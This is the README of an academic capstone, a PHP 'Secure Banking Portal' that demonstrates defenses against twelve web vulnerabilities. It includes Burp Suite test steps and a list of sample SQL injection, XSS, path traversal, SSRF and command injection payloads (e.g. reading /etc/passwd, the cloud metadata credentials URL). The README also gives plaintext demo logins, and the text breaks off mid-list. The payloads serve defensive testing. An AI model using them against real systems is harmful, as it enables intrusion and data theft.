# Secure Banking Portal: A Web Application for Secure Transactions and Vulnerability Mitigation

![CI](https://github.com/Sudharsan1122/secure-banking-portal/actions/workflows/ci.yml/badge.svg)
![CodeQL](https://github.com/Sudharsan1122/secure-banking-portal/actions/workflows/codeql.yml/badge.svg)
![Deploy](https://github.com/Sudharsan1122/secure-banking-portal/actions/workflows/deploy.yml/badge.svg)
![Vulnerabilities](https://img.shields.io/badge/vulnerabilities%20mitigated-12%2F12-brightgreen)
![Tests](https://img.shields.io/badge/tests-99%2F99-brightgreen)
![PHP](https://img.shields.io/badge/PHP-8.2-blue)
![License](https://img.shields.io/badge/license-MIT-green)

> **Academic Capstone Project**  
> **Course**: Web Application Security & Advanced Web Architectures  
> **Tech Stack**: PHP 8+ (Vanilla), MySQL (InnoDB/PDO), HTML5, CSS3, Vanilla ES6 JavaScript (Fetch API/JSON), Apache  

---

## 🔄 CI/CD Pipeline

Every push to `main` triggers:

1. **CI** — 99+ tests, PHP lint, secrets scan, DB seed verification, hash-chain check
2. **CodeQL** — SAST for JS + PHP
3. **Security Audit** — composer audit + TruffleHog
4. **Deploy** — multi-stage Docker image pushed to GHCR, tagged with `${{ github.sha }}`

Pull requests require:
- All checks green
- Security checklist completed
- Hash chain verified

## 🐳 Docker

Local run:
```bash
cp .env.example .env       # edit secrets
docker compose up --build
# App: http://localhost:8080
```

---

## Table of Contents
1. [Project Overview & Security Philosophy](#1-project-overview--security-philosophy)
2. [The 12 Defended Web Vulnerabilities (Deep-Dive Guides)](#2-the-12-defended-web-vulnerabilities-deep-dive-guides)
3. [ASCII Architecture & Defense-in-Depth Diagram](#3-ascii-architecture--defense-in-depth-diagram)
4. [Pre-configured Demonstration Credentials](#4-pre-configured-demonstration-credentials)
5. [Step-by-Step Setup Guide (XAMPP / LAMP)](#5-step-by-step-setup-guide-xampp--lamp)
6. [OWASP Top 10 & Security Feature Checklist](#6-owasp-top-10--security-feature-checklist)
7. [Burp Suite Penetration Testing & Exploit Verification Guide](#7-burp-suite-penetration-testing--exploit-verification-guide)
8. [Sample Malicious Payloads for Evaluation](#8-sample-malicious-payloads-for-evaluation)
9. [Academic Syllabus-to-Feature Mapping Matrix](#9-academic-syllabus-to-feature-mapping-matrix)
10. [Screenshots & Documentation Placeholders](#10-screenshots--documentation-placeholders)
11. [Distinction-Grade Upgrades: Pillar A — Security Depth](#11-distinction-grade-upgrades-pillar-a--security-depth)
12. [Distinction-Grade Upgrades: Pillar C — Observability & SOC](#12-distinction-grade-upgrades-pillar-c--observability--soc)
13. [Distinction-Grade Upgrades: Pillar B — Real-World Commercial Banking Features](#13-distinction-grade-upgrades-pillar-b--real-world-commercial-banking-features)
14. [Distinction-Grade Upgrades: Pillar D — Academic Rigor & Report-Ready Documentation](#14-distinction-grade-upgrades-pillar-d--academic-rigor--report-ready-documentation)
15. [Distinction-Grade Upgrades: Pillar E — Fintech-Grade UI & Modern UX Architecture](#15-distinction-grade-upgrades-pillar-e--fintech-grade-ui--modern-ux-architecture)
16. [Distinction-Grade Upgrades: Pillar F — Code Quality, Static Analysis & Defensive Standards](#16-distinction-grade-upgrades-pillar-f--code-quality-static-analysis--defensive-standards)
17. [Master Comprehensive Test Suite (26 Suites, 147 Tests, 100% Pass)](#17-master-comprehensive-test-suite-26-suites-147-tests-100-pass)
18. [12 Vulnerabilities Attack Regression Runner (46 Tests, 100% Pass)](#18-12-vulnerabilities-attack-regression-runner-46-tests-100-pass)
19. [Examiner Viva Voce Defense & Master Q&A Bank](#19-examiner-viva-voce-defense--master-qa-bank)

---

## 2. The 12 Defended Web Vulnerabilities (Deep-Dive Guides)

Every defended vulnerability features its own standalone dossier in [`docs/attacks/`](docs/attacks/README.md) containing CVSS ratings, prerequisites, intentionally vulnerable code anti-patterns, our hardened production implementations, dynamic verification steps, and regression test suites:

| # | Vulnerability File | Attack Vector | OWASP | CWE | Target Endpoint | Status |
|---|---|---|---|---|---|---|
| **01** | [`docs/attacks/01-sqli-login.md`](docs/attacks/01-sqli-login.md) | SQL Injection on Login (Auth Bypass) | A03:2021 | CWE-89 | `POST /api/login.php` | ✅ Mitigated |
| **02** | [`docs/attacks/02-sqli-search.md`](docs/attacks/02-sqli-search.md) | SQL Injection on Transaction Search | A03:2021 | CWE-89 | `GET /api/transactions.php` | ✅ Mitigated |
| **03** | [`docs/attacks/03-stored-xss.md`](docs/attacks/03-stored-xss.md) | Stored XSS via Transaction Remarks | A03:2021 | CWE-79 | `POST /api/transfer.php` | ✅ Mitigated |
| **04** | [`docs/attacks/04-reflected-xss.md`](docs/attacks/04-reflected-xss.md) | Reflected XSS via Search Query | A03:2021 | CWE-79 | `GET /admin/users.php` | ✅ Mitigated |
| **05** | [`docs/attacks/05-idor-account.md`](docs/attacks/05-idor-account.md) | IDOR on Source Account Debit | A01:2021 | CWE-639 | `POST /api/transfer.php` | ✅ Mitigated |
| **06** | [`docs/attacks/06-idor-transaction.md`](docs/attacks/06-idor-transaction.md) | IDOR on Transaction Receipt Details | A01:2021 | CWE-639 | `GET /api/transactions.php` | ✅ Mitigated |
| **07** | [`docs/attacks/07-csrf.md`](docs/attacks/07-csrf.md) | Cross-Site Request Forgery (CSRF) | A01:2021 | CWE-352 | `POST /api/transfer.php` | ✅ Mitigated |
| **08** | [`docs/attacks/08-clickjacking.md`](docs/attacks/08-clickjacking.md) | UI Redressing / Clickjacking | A05:2021 | CWE-1021 | `ALL /frontend/*.html` | ✅ Mitigated |
| **09** | [`docs/attacks/09-dom-xss.md`](docs/attacks/09-dom-xss.md) | DOM-Based XSS via Client-Side Sinks | A03:2021 | CWE-79 | `ALL /js/*.js` | ✅ Mitigated |
| **10** | [`docs/attacks/10-path-traversal.md`](docs/attacks/10-path-traversal.md) | Directory / Path Traversal | A01:2021 | CWE-22 | `GET /api/download_statement.php` | ✅ Mitigated |
| **11** | [`docs/attacks/11-bac.md`](docs/attacks/11-bac.md) | Broken Access Control on Admin Routes | A01:2021 | CWE-284 | `ALL /admin/*.php` | ✅ Mitigated |
| **12** | [`docs/attacks/12-file-upload.md`](docs/attacks/12-file-upload.md) | Malicious File Upload (Web Shell) | A04:2021 | CWE-434 | `POST /api/avatar.php` | ✅ Mitigated |

### Run Attack Regression Suite:
```bash
php tests/attacks/run_attack_tests.php
```

---

## 1. Project Overview & Security Philosophy

The **Secure Banking Portal** is designed from the ground up not merely to support banking transactions (accounts, balances, transfers, beneficiaries, statements), but to serve as a comprehensive demonstration of **defensive web programming** and **application-layer vulnerability mitigation**.

### Core Defensive Pillars:
- **Zero-Trust Input Processing**: Strict allow-list regex filtering, type constraints, and payload inspection.
- **True Prepared Statements**: `PDO::ATTR_EMULATE_PREPARES => false` ensures queries are compiled strictly on the MySQL database server, rendering SQL injection impossible.
- **ACID Transaction Atomicity & Pessimistic Concurrency**: Monetary transfers utilize `PDO::beginTransaction()`, `SELECT ... FOR UPDATE` row locks, and symmetric debits/credits to eliminate race conditions and double-spending.
- **Two-Phase Multi-Factor Authentication (MFA)**: Cryptographic 6-digit temporal OTPs with 5-minute lifespans, single-use enforcement, and session regeneration to defeat session fixation.
- **Synchronizer Token Pattern (CSRF)**: Cryptographically random 64-character hex tokens compared using timing-safe `hash_equals()`.
- **Context-Aware Escaping & DOM XSS Defenses**: Output is sanitized with `htmlspecialchars(..., ENT_QUOTES, 'UTF-8')` on the server and rendered exclusively via `textContent` and `createElement` in client JavaScript.
- **Real-Time SIEM / SOC Telemetry**: Comprehensive audit trail logging every security-relevant event into `security_logs` with a live 10-second polling administrator dashboard.

---

## 2. ASCII Architecture & Defense-in-Depth Diagram

```
+-----------------------------------------------------------------------------+
|                             WEB CLIENT BROWSER                              |
|   HTML5 Semantic DOM  |  Vanilla ES6 Fetch API  |  Strict textContent Sink  |
+-----------------------------------------------------------------------------+
                                       │
                                       │ HTTP/HTTPS Request
                                       │ [Cookie: SECURE_BANK_SESSID]
                                       │ [Header: X-CSRF-Token]
                                       ▼
+-----------------------------------------------------------------------------+
|                     APACHE WEB SERVER LAYER (.htaccess)                     |
|  - Options -Indexes (Directory listing disabled)                            |
|  - Block direct access to: /statements/*, /logs/*, /config/*, /security/*   |
|  - Block file extensions: *.sql, *.log, *.ini, *.bak                        |
+-----------------------------------------------------------------------------+
                                       │
                                       ▼
+-----------------------------------------------------------------------------+
|                     PHP 8+ DEFENSIVE MIDDLEWARE PIPELINE                    |
|  1. security_headers.php : X-Frame-Options: DENY, CSP, nosniff, HSTS, CORS  |
|  2. rate_limit.php       : Max 5 failed logins per 15 min per IP/Username   |
|  3. auth.php             : HttpOnly + SameSite=Strict, 15m idle timeout     |
|  4. csrf.php             : Timing-safe hash_equals() validation (403 guard) |
|  5. validation.php       : Allowlist regex & XSS/SQLi payload signatures    |
|  6. logger.php           : Structured SIEM audit trail to security_logs     |
+-----------------------------------------------------------------------------+
                                       │
                                       ▼
+-----------------------------------------------------------------------------+
|                          CONTROLLER & API ENDPOINTS                         |
|  /api/login.php          /api/verify_otp.php      /api/transfer.php         |
|  /api/dashboard.php      /api/transactions.php    /api/download_statement  |
|  /api/beneficiaries.php  /api/profile.php         /api/admin_diagnostics    |
+-----------------------------------------------------------------------------+
                                       │
                        PDO Prepared Statements (Emulation: FALSE)
                        ACID Transactions (SELECT ... FOR UPDATE)
                                       ▼
+-----------------------------------------------------------------------------+
|                       MYSQL DATABASE ENGINE (InnoDB)                        |
|  - users                 - accounts               - transactions            |
|  - beneficiaries         - otp_codes              - login_attempts          |
|  - security_logs         [Charset: utf8mb4 / Collation: utf8mb4_unicode_ci] |
+-----------------------------------------------------------------------------+
```

---

## 3. Pre-configured Demonstration Credentials

The database is seeded with two primary demo accounts ready for evaluation:

| Account Type | Username | Password | Role | Starting Balance | Purpose |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **System Admin** | `admin` | `Admin@1234` | `admin` | \$100,000.00 | SOC SIEM Dashboard & Diagnostics |
| **Standard User** | `john_doe` | `User@1234` | `user` | \$15,500.00 | Fund Transfers & Statements |
| **Test Payee** | `alice_smith` | `User@1234` | `user` | \$5,250.00 | Recipient Account (`ACC-USER-1003`) |

> **Simulated MFA Notice**: During Step 2 login, the generated 6-digit OTP is automatically queried from `otp_codes` and presented on screen with an **"Auto-fill Code"** shortcut, allowing offline academic grading without requiring external SMS gateways.

---

## 4. Step-by-Step Setup Guide (XAMPP / LAMP)

### Prerequisites
- Apache 2.4+
- PHP 8.0 or higher
- MySQL 5.7+ or MariaDB 10.4+

### Option A: Running via XAMPP on Windows

1. **Start Services**:
   - Launch the **XAMPP Control Panel**.
   - Start **Apache** and **MySQL**.

2. **Database Import**:
   - Open **phpMyAdmin** (`http://localhost/phpmyadmin`) or open a command prompt and run:
     ```bash
     C:\xampp\mysql\bin\mysql.exe -u root -p < "Secure-Banking-Portal\database\banking.sql"
     ```
   - This creates the `secure_banking` database, creates all 7 tables, and populates seed data with verified Bcrypt hashes.

3. **Deploy Web Root**:
   - Copy or symlink the `Secure-Banking-Portal` folder into your Apache `htdocs` directory:
     ```
     C:\xampp\htdocs\Secure-Banking-Portal
     ```
   - Alternatively, navigate your browser to:
     ```
     http://localhost/Secure-Banking-Portal/frontend/index.html
     ```

4. **Database Configuration Verification**:
   - Inspect `config/constants.php`: Default parameters are `DB_HOST = 127.0.0.1`, `DB_PORT = 3306`, `DB_NAME = secure_banking`, `DB_USER = root`, and `DB_PASS = ''`.

---

### Option B: Running via Built-in PHP Development Server (Quick Testing)

For rapid grading without moving files to `htdocs`:
```bash
# 1. Import database into MySQL
mysql -u root -p < database/banking.sql

# 2. Launch PHP 8+ Server from project root
cd "Secure-Banking-Portal"
php -S 127.0.0.1:8080
```
Open `http://127.0.0.1:8080/frontend/index.html` in your browser.

---

## 5. OWASP Top 10 & Security Feature Checklist

| # | Vulnerability Category | Mitigation Mechanism Implemented | Verification Location |
| :---: | :--- | :--- | :--- |
| **1** | **Broken Access Control** | Role-based authorization via `require_admin()` and `require_auth()`; session validation before serving financial data. | [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php) |
| **2** | **Cryptographic Failures** | Passwords hashed using `password_hash(PASSWORD_BCRYPT)` with auto-salting; CSPRNG `random_bytes(32)` for CSRF tokens. | [`api/register.php`](file:///Secure-Banking-Portal/api/register.php), [`security/csrf.php`](file:///Secure-Banking-Portal/security/csrf.php) |
| **3** | **Injection (SQLi)** | Native PDO prepared statements with `ATTR_EMULATE_PREPARES => false`; zero dynamic string concatenation in queries. | [`config/database.php`](file:///Secure-Banking-Portal/config/database.php), all `/api/*.php` |
| **4** | **Insecure Design (Race Conditions)** | ACID transactions with pessimistic row-locking (`SELECT ... FOR UPDATE`) on account balances during fund routing. | [`api/transfer.php`](file:///Secure-Banking-Portal/api/transfer.php) |
| **5** | **Security Misconfiguration** | Defensive headers: `X-Frame-Options: DENY`, strict CSP, `nosniff`, `SameSite=Strict`, `HttpOnly`. | [`security/security_headers.php`](file:///Secure-Banking-Portal/security/security_headers.php) |
| **6** | **Vulnerable Components** | Zero third-party dependencies or external framework code (100% Vanilla PHP 8 and native JS). | Codebase Root |
| **7** | **Auth & Identification Failures** | Multi-factor authentication (MFA); `session_regenerate_id(true)` upon login; 15-minute idle timeout; 5-attempt rate limiter. | [`security/rate_limit.php`](file:///Secure-Banking-Portal/security/rate_limit.php), [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php) |
| **8** | **Software & Data Integrity (CSRF)** | Synchronizer Token Pattern using custom `X-CSRF-Token` headers; constant-time `hash_equals()` validation. | [`security/csrf.php`](file:///Secure-Banking-Portal/security/csrf.php) |
| **9** | **Security Logging & Monitoring** | Persistent SIEM logging of all auth events, attacks, and transfers; live SOC monitoring dashboard with 10s auto-refresh. | [`security/logger.php`](file:///Secure-Banking-Portal/security/logger.php), [`admin/security-dashboard.php`](file:///Secure-Banking-Portal/admin/security-dashboard.php) |
| **10** | **SSRF & Command Injection** | Domain whitelist check, private IP blocking (`127.0.0.0/8`, `169.254.0.0/16`); native PHP diagnostics with zero OS shell invocation. | [`api/admin_diagnostics.php`](file:///Secure-Banking-Portal/api/admin_diagnostics.php) |
| **11** | **Cross-Site Scripting (XSS)** | Contextual HTML escaping via `safe_html()` (`htmlspecialchars`) and client DOM manipulation restricted to `textContent`. | [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php), [`js/dashboard.js`](file:///Secure-Banking-Portal/js/dashboard.js) |
| **12** | **Directory Traversal** | Strict regex format validation (`/^\d{4}-(0[1-9]|1[0-2])$/`) and canonical path boundary validation via `realpath()`. | [`api/download_statement.php`](file:///Secure-Banking-Portal/api/download_statement.php) |

---

## 6. Burp Suite Penetration Testing & Exploit Verification Guide

To test the application using an interception proxy like **Burp Suite** or **OWASP ZAP**:

### Test 1: Cross-Site Request Forgery (CSRF) Tampering
1. Log in as `john_doe` and navigate to the **Transfer Money** page.
2. In Burp Suite, turn **Intercept On**.
3. Submit a \$10.00 transfer. Intercept the `POST /api/transfer.php` request.
4. **Action**: Remove or modify the `X-CSRF-Token` header.
5. Forward the request.
6. **Expected Result**: Server immediately aborts the transaction with `HTTP 403 Forbidden`:
   ```json
   {
       "status": "error",
       "code": "CSRF_VALIDATION_FAILED",
       "message": "Cross-Site Request Forgery (CSRF) token validation failed. Request terminated."
   }
   ```
7. Verify that no funds were debited, and navigate to the **SOC Admin Dashboard** to verify that a `CSRF_FAILURE` audit entry was recorded.

---

### Test 2: SQL Injection Bypass Attempt
1. On the login form, attempt authentication using classic SQL injection payloads:
   - Username: `' OR '1'='1` or `admin'--`
   - Password: `any_password`
2. **Expected Result**: Authentication fails with `HTTP 401 Unauthorized` ("Invalid username or password").
3. Inspect `security_logs` to confirm that the `SQLI_BLOCKED` threat signature was logged.

---

### Test 3: Stored & DOM-Based XSS Injection
1. Execute a transfer with the following payload in the **Remark** field:
   ```html
   <script>alert(document.cookie)</script>
   ```
   or
   ```html
   <img src=x onerror=alert('XSS-Executed')>
   ```
2. Navigate to `dashboard.html` and `transactions.html`.
3. **Expected Result**:
   - The payload is rendered harmlessly as plain literal text: `&lt;script&gt;...`
   - No JavaScript execution or alert popups trigger.
   - Inspect the DOM element: Notice that the browser created a text node via `textContent`, neutralizing the tags.

---

### Test 4: Directory Traversal via Statement Download
1. In Burp Suite, send a request to download an account statement with path traversal sequences:
   ```http
   GET /api/download_statement.php?date=../../etc/passwd HTTP/1.1
   Host: localhost
   Cookie: SECURE_BANK_SESSID=...
   ```
   or on Windows:
   ```http
   GET /api/download_statement.php?date=..\..\windows\win.ini HTTP/1.1
   ```
2. **Expected Result**: `HTTP 400 Bad Request` ("Invalid statement date format. Expected YYYY-MM").
3. If an attacker attempts to pass a raw `file` parameter (`?file=../../etc/passwd`), the server returns `HTTP 400 Bad Request` ("Path traversal pattern detected and blocked by security firewall") and logs a `DIRECTORY_TRAVERSAL` incident.

---

### Test 5: Server-Side Request Forgery (SSRF) Filter
1. Sign in as `admin` and open the **SOC Dashboard**.
2. In the **External Service Checker**, submit:
   - Target 1: `http://169.254.169.254/latest/meta-data` (AWS IMDS metadata)
   - Target 2: `http://127.0.0.1:3306` (Local MySQL instance)
   - Target 3: `http://evil-attacker.com/webhook`
3. **Expected Result**:
   - Targets 1 & 2 are blocked with `HTTP 403 Forbidden` ("Access to internal/private IP address is strictly prohibited").
   - Target 3 is blocked with `HTTP 403 Forbidden` ("Host is not an approved banking partner API").
   - Target `https://rates.openexchangerates.org/api/latest` resolves to a public IP and passes.

---

### Test 6: Brute-Force Rate Limiting
1. Submit 6 consecutive failed logins for username `john_doe` with incorrect passwords.
2. On the 6th attempt:
   ```http
   HTTP/1.1 429 Too Many Requests
   Content-Type: application/json

   {
       "status": "error",
       "code": "RATE_LIMIT_EXCEEDED",
       "message": "Too many failed login attempts. For your security, this account/IP is locked for 15 minutes."
   }
   ```
3. Subsequent login requests are rejected until the 15-minute sliding window lapses.

---

## 7. Sample Malicious Payloads for Evaluation

```text
=== SQL Injection Payloads ===
' OR '1'='1
admin' -- -
' UNION SELECT null, null, @@version, null, null, null, null, null, null, null -- 
" OR "" = "

=== Cross-Site Scripting (XSS) Payloads ===
<script>alert(document.cookie)</script>
<img src=x onerror="alert('XSS')">
<svg/onload=alert('XSS')>
javascript:alert('XSS')

=== Directory Traversal Payloads ===
../../etc/passwd
..\..\windows\win.ini
2026-01/../../../../windows/system32/drivers/etc/hosts
....//....//....//etc/shadow

=== SSRF Attack Payloads ===
http://127.0.0.1:80/
http://localhost:3306/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://10.0.0.1/admin
http://192.168.1.1/router-config

=== OS Command Injection Payloads (Tested against safe diagnostics) ===
127.0.0.1; whoami
127.0.0.1 && cat /etc/passwd
127.0.0.1 | dir
`id`
```

---

## 8. Academic Syllabus-to-Feature Mapping Matrix

This matrix maps core Web Application Security curriculum topics directly to their technical implementation files:

| Course Concept | Technical Implementation in Portal | Source Code Location |
| :--- | :--- | :--- |
| **Web Architecture** | Decoupled client-server architecture with RESTful JSON API layer and Apache runtime. | Whole repository |
| **HTML5 & Semantic Structure** | Semantic forms, accessible labels, input validation constraints, modern layout. | [`frontend/*.html`](file:///Secure-Banking-Portal/frontend/) |
| **CSS3 & Responsive Design** | Custom theme (Midnight Navy & Slate), CSS Grid, Flexbox, Toast animations. | [`css/style.css`](file:///Secure-Banking-Portal/css/style.css) |
| **JavaScript & DOM Security** | Asynchronous Fetch API client; strict use of `textContent` to defeat DOM XSS. | [`js/*.js`](file:///Secure-Banking-Portal/js/) |
| **AJAX / Fetch & JSON API** | Non-blocking HTTP POST/GET exchanges communicating exclusively via JSON payloads. | [`api/*.php`](file:///Secure-Banking-Portal/api/), [`js/*.js`](file:///Secure-Banking-Portal/js/) |
| **PHP 8 Server Backend** | Native procedural & class-based PHP 8 with strict types, exception traps, and zero frameworks. | [`api/*.php`](file:///Secure-Banking-Portal/api/), [`security/*.php`](file:///Secure-Banking-Portal/security/) |
| **Database Connectivity & PDO** | PDO with `PDO::ATTR_EMULATE_PREPARES => false` and UTF-8 charset. | [`config/database.php`](file:///Secure-Banking-Portal/config/database.php) |
| **Session Security** | `session_regenerate_id(true)`, 15-minute inactivity timeout, session destruction. | [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php) |
| **Cookie Attributes** | `HttpOnly` (blocks script theft), `SameSite=Strict` (blocks cross-site transport), `Secure`. | [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php) |
| **Authentication & Password Hashing** | Bcrypt hashing via `password_hash(PASSWORD_BCRYPT)` and `password_verify()`. | [`api/register.php`](file:///Secure-Banking-Portal/api/register.php), [`api/login.php`](file:///Secure-Banking-Portal/api/login.php) |
| **Multi-Factor Authentication (MFA)** | 6-digit temporal OTP tokens with 5-minute expiry and single-use invalidation. | [`api/verify_otp.php`](file:///Secure-Banking-Portal/api/verify_otp.php), [`frontend/mfa.html`](file:///Secure-Banking-Portal/frontend/mfa.html) |
| **Cross-Site Scripting (XSS)** | Sanitization with `htmlspecialchars(..., ENT_QUOTES)` and client `textContent` sinks. | [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php), [`js/dashboard.js`](file:///Secure-Banking-Portal/js/dashboard.js) |
| **CSRF Defense** | Synchronizer Token Pattern (STP) using 32-byte CSPRNG hex tokens and `hash_equals()`. | [`security/csrf.php`](file:///Secure-Banking-Portal/security/csrf.php) |
| **CORS Policy** | Whitelist-based origin verification with preflight OPTIONS response and credential support. | [`security/security_headers.php`](file:///Secure-Banking-Portal/security/security_headers.php) |
| **Clickjacking Mitigation** | Frame busting via `X-Frame-Options: DENY` and CSP `frame-ancestors 'none'`. | [`security/security_headers.php`](file:///Secure-Banking-Portal/security/security_headers.php) |
| **SQL Injection Defense** | Parameterized prepared statements across all SELECT, INSERT, UPDATE, and DELETE queries. | All endpoints in [`api/*.php`](file:///Secure-Banking-Portal/api/) |
| **OS Command Injection Defense** | Introspection via native PHP functions (`php_uname`, `disk_free_space`) avoiding `shell_exec`. | [`api/admin_diagnostics.php`](file:///Secure-Banking-Portal/api/admin_diagnostics.php) |
| **Directory Traversal Defense** | Regex date constraints + canonical directory jail verification via `realpath()`. | [`api/download_statement.php`](file:///Secure-Banking-Portal/api/download_statement.php) |
| **SSRF Prevention** | Protocol restriction, approved host allowlist, and private RFC 1918 / IMDS IP filtering. | [`api/admin_diagnostics.php`](file:///Secure-Banking-Portal/api/admin_diagnostics.php) |
| **Input Validation** | Allowlist regex patterns for usernames, emails, phone numbers, and transaction amounts. | [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php) |
| **Security Auditing & Logging** | Structured security event ledger recording IP, user ID, event category, and payload context. | [`security/logger.php`](file:///Secure-Banking-Portal/security/logger.php), [`admin/security-dashboard.php`](file:///Secure-Banking-Portal/admin/security-dashboard.php) |

---

## 9. Screenshots & Documentation Placeholders

Below are recommended documentation screenshots to capture for your capstone project report:

1. **`docs/screenshots/01_portal_overview.png`**  
   *Landing page detailing security architecture, technology stack, and demo credentials.*
2. **`docs/screenshots/02_login_and_rate_limiting.png`**  
   *Step 1 login screen showing rate-limit lockout notification after 5 failed attempts.*
3. **`docs/screenshots/03_mfa_verification.png`**  
   *Step 2 MFA verification interface with 6-digit OTP code prompt.*
4. **`docs/screenshots/04_customer_dashboard.png`**  
   *Account balance hero card, quick actions, and recent transactions.*
5. **`docs/screenshots/05_transfer_acid_locking.png`**  
   *Money transfer form showing balance validation, CSRF integration, and transfer confirmation.*
6. **`docs/screenshots/06_xss_prevention_demo.png`**  
   *Transactions table rendering raw script tags harmlessly as textContent literals.*
7. **`docs/screenshots/07_directory_traversal_blocked.png`**  
   *Statement download form blocking directory traversal payload (`../../etc/passwd`).*
8. **`docs/screenshots/08_admin_soc_dashboard.png`**  
   *Real-time SIEM dashboard showing live attack telemetry, metrics cards, and audit log table.*
9. **`docs/screenshots/09_ssrf_firewall_rejection.png`**  
   *Admin external service checker blocking AWS metadata IP `169.254.169.254`.*
10. **`docs/screenshots/10_burp_suite_csrf_intercept.png`**  
    *Burp Suite HTTP request/response showing HTTP 403 Forbidden on missing CSRF token.*

---

## 10. Distinction-Grade Upgrades: Pillar A — Security Depth

The project was systematically upgraded from a standard working prototype into an enterprise-grade, distinction-caliber security artifact by implementing 13 advanced defensive mechanisms addressing subtle, real-world attack vectors:

### Upgrade Breakdown:

1. **[A1] Dynamic Nonce-Based Content Security Policy 2.0**:
   - **File**: [`security/security_headers.php`](file:///Secure-Banking-Portal/security/security_headers.php)
   - **Mechanism**: Eliminates `'unsafe-inline'` completely. Generates a fresh 256-bit CSPRNG base64 nonce (`get_csp_nonce()`) per HTTP request. Enforces `script-src 'self' 'nonce-...'; object-src 'none'; base-uri 'self'; require-trusted-types-for 'script'`.
   - **Impact**: Any injected script tag lacking the server-side generated nonce is immediately refused execution by modern browser engines.

2. **[A2] Subresource Integrity (SRI) Verification**:
   - **File**: [`security/security_headers.php`](file:///Secure-Banking-Portal/security/security_headers.php)
   - **Mechanism**: The helper function `sri_asset($path, $type)` computes the SHA-384 cryptographic digest of any local or external CSS/JS resource (`integrity="sha384-..." crossorigin="anonymous"`).
   - **Impact**: Defends against CDN poisoning, local asset tampering, and Man-in-the-Middle alterations.

3. **[A3] Centralized Sliding-Window Multi-Endpoint Rate Limiting**:
   - **Files**: [`security/rate_limit.php`](file:///Secure-Banking-Portal/security/rate_limit.php), table `rate_limits`
   - **Mechanism**: Tracks request attempts per client IP and endpoint path using sliding time windows. When an endpoint threshold is exceeded (e.g., 5 attempts / 15m on login, 10 / min on transfers), the server halts execution, logs a `RATE_LIMIT_EXCEEDED` event, sets HTTP 429, and emits the standardized `Retry-After: <seconds>` header.

4. **[A4] 3-Tier Exponential Account Lockout Engine**:
   - **Files**: [`security/rate_limit.php`](file:///Secure-Banking-Portal/security/rate_limit.php), table `users`
   - **Mechanism**: Implements progressive account penalties upon consecutive failed credentials:
     - *Tier 1 (5 failed attempts)*: 5-minute temporary lockout.
     - *Tier 2 (10 failed attempts)*: 30-minute cooling-off lockout.
     - *Tier 3 (15 failed attempts)*: Permanent administrative lock (`locked_until = '2099-12-31'`). Requires manual admin intervention via `admin_unlock_account()`.

5. **[A5] Secure Token-Based Password Reset (SHA-256 Hashed)**:
   - **Files**: [`api/request_reset.php`](file:///Secure-Banking-Portal/api/request_reset.php), [`api/reset_password.php`](file:///Secure-Banking-Portal/api/reset_password.php), [`frontend/forgot-password.html`](file:///Secure-Banking-Portal/frontend/forgot-password.html), [`frontend/reset-password.html`](file:///Secure-Banking-Portal/frontend/reset-password.html)
   - **Mechanism**:
     - *Token Hashing*: Generates 256 bits of CSPRNG entropy; stores ONLY the SHA-256 hash (`hash('sha256', $rawToken)`) in table `password_resets`. Raw tokens are never persisted, neutralizing offline DB dump compromise.
     - *Anti-Enumeration*: Uniform response contract regardless of whether the submitted identifier exists.
     - *Single-Use Enforcement*: Consumed tokens are flagged `used = 1` immediately, stopping replay attacks.
     - *Session Revocation*: Updating password updates `password_changed_at = NOW()`, instantaneously invalidating all pre-existing sessions across all devices.

6. **[A6] Dual-Tier Session Expiration Engine**:
   - **Files**: [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php), [`api/heartbeat.php`](file:///Secure-Banking-Portal/api/heartbeat.php)
   - **Mechanism**: Enforces two independent session boundaries:
     - *Idle Timeout (15 minutes)*: Resets on every authenticated API exchange; terminates on prolonged client inactivity.
     - *Absolute Lifetime Ceiling (8 hours)*: Anchored to initial login timestamp (`$_SESSION['login_time']`). Forces full credential re-authentication even if actively used, preventing permanent rolling sessions.

7. **[A7] Four-Site Session Fixation Defense**:
   - **Files**: [`security/auth.php`](file:///Secure-Banking-Portal/security/auth.php), [`api/login.php`](file:///Secure-Banking-Portal/api/login.php), [`api/verify_otp.php`](file:///Secure-Banking-Portal/api/verify_otp.php), [`api/reset_password.php`](file:///Secure-Banking-Portal/api/reset_password.php)
   - **Mechanism**: Strict invocation of `session_regenerate_id(true)` at 4 critical authentication state transitions:
     1. Primary credential validation (`/api/login.php`).
     2. Two-factor OTP / Recovery code completion (`/api/verify_otp.php`).
     3. Password rotation / reset completion (`/api/reset_password.php`).
     4. Administrative role / privilege elevation (`/admin/*`).

8. **[A8] Multi-Layered Secure Avatar File Upload & Proxy Streaming**:
   - **Files**: [`api/avatar.php`](file:///Secure-Banking-Portal/api/avatar.php), [`uploads/.htaccess`](file:///Secure-Banking-Portal/uploads/.htaccess), directory `uploads/avatars/`
   - **Mechanism**: Complete 6-tier upload defense pipeline:
     1. *Size Limit*: Strict 2 MB boundary.
     2. *Extension Allow-list*: Rejects `.php`, `.svg`, `.html`, `.phtml`; permits only `.jpg`, `.jpeg`, `.png`.
     3. *Binary MIME Verification*: Real binary inspection via `finfo(FILEINFO_MIME_TYPE)` prevents polyglots masquerading with image extensions.
     4. *Raster Geometry & Bomb Guard*: Verifies authenticity with `getimagesize()` and bounds checks (width/height $\le$ 4096px).
     5. *GD Re-encoding & Payload Neutralization*: Decodes raster pixels and reconstructs the image from scratch, stripping all EXIF metadata, camera tags, and trailing PHP webshell payloads.
     6. *Randomized UUID & Proxy Streaming*: Files are stored as `avatar_{uid}_{uuid}.(jpg|png)` in a directory with execution disabled via `.htaccess` (`SetHandler default-handler`, `RemoveHandler .php`). Serviced exclusively through PHP proxy with `X-Content-Type-Options: nosniff`.

9. **[A9] HTTP Parameter Pollution (HPP) Defense**:
   - **File**: [`security/validation.php`](file:///Secure-Banking-Portal/security/validation.php)
   - **Mechanism**: `guard_parameter_pollution()` parses raw `$_SERVER['QUERY_STRING']` and checks for duplicate parameter keys before PHP superglobals can silently overwrite or truncate inputs. Duplicate occurrences trigger immediate HTTP 400 and high-severity security audit logging.

10. **[A10] Strict HTTP Method Enforcement**:
